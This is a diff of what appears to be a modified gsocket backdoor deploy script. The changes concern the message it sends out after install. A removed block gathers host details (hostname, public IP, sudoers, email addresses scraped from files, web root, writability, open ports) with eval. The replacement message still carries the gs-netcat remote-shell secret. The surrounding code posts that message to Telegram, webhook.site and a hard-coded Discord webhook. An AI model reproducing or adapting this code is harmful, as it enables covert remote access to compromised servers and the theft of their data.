@@ -87,35 +87,7 @@ unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-# ==============================================================================
-# HAPUS BARIS MSG LAMA DAN GANTI DENGAN BLOK DI BAWAH INI
-# ==============================================================================
-
-# 1. Mengumpulkan seluruh template informasi telemetri sistem
-msg_raw=$(cat <<EOF
-\$(hostname) --- \$(uname -rom)
-🌐 Domain: \$(hostname -f || echo "N/A")
-🐧 OS: \$(grep -Po "^PRETTY_NAME=\"\K[^\"]*" /etc/os-release 2>/dev/null || echo "Linux")
-⚡ CPU: \$(grep -m1 "model name" /proc/cpuinfo | awk -F: "{print \$2}" | sed "s/^ //" || echo "N/A")
-👤 User: \$(whoami) (Sudoers: \$(grep -Po "^sudo:.*:\K.*" /etc/group 2>/dev/null || echo "N/A"))
-🖥️ IP: \$(curl -s ifconfig.me || hostname -I | awk "{print \$1}")
-📧 Email: \$(grep -rioE "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}" . 2>/dev/null | head -n 1 || echo "N/A")
-📅 Time: \$(date "+%Y-%m-%d %H:%M:%S") (Up: \$(uptime -p 2>/dev/null || echo "N/A"))
-🐘 PHP: \$(php -r "echo PHP_VERSION;" 2>/dev/null || echo "N/A")
-📂 Path: \$(for d in public_html public www httpdocs html; do [ -d "\$d" ] && echo "\$(pwd)/\$d" && break; done || echo "\$(pwd)") (Writable: \$([ -w . ] && echo "YES" || echo "NO"))
-📊 Disk: \$(df -h / | awk "NR==2 {print \$4\"/\"\$2\" Free\"}") | RAM: \$(free -m | awk "NR==2 {print \$4\"MB/\"\$2\"MB Free\"}")
-⚙️ WebServer: \$(apache2 -v 2>/dev/null | head -n1 | awk "{print \$3}" || nginx -v 2>&1 | awk "{print \$3}" || echo "Unknown")
-🔌 Ports: \$(ss -tlnp | awk "NR>1 {print \$4}" | awk -F: "{print \$NF}" | sort -nu | tr "\n" "," | sed "s/,$//")
---- gs-netcat -i -s \${GS_SECRET}
-EOF
-)
-
-# 2. PERBAIKAN: Mengeksekusi perintah di dalam template, lalu mengubah hasilnya menjadi URL Encode
-msg_executed=$(eval "echo \"$msg_raw\"")
-msg=$(echo "$msg_executed" | curl -s -o /dev/null -w "%{url_effective}" --data-urlencode @- "" | cut -c 3-)
-# ==============================================================================
-# PROSES PENGIRIMAN WEBHOOK DI BAWAH AKAN BERJALAN AMAN DAN UTUH
-# ==============================================================================
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
 # GS_TG_TOKEN="5794110125:AAFDNb..."
 # GS_TG_CHATID="-8834838..."
@@ -137,7 +109,7 @@ msg=$(echo "$msg_executed" | curl -s -o /dev/null -w "%{url_effective}" --data-u
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
 ### discord webhook
-GS_DISCORD_KEY="1490549036942360746/EZehWpNsDV4l511kjfYe-EuwgerRkY6Qq6DPsvC6XCK1EPNUP8OAF243zO9NoTURyVAo"
+ GS_DISCORD_KEY="1490549036942360746/EZehWpNsDV4l511kjfYe-EuwgerRkY6Qq6DPsvC6XCK1EPNUP8OAF243zO9NoTURyVAo"
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
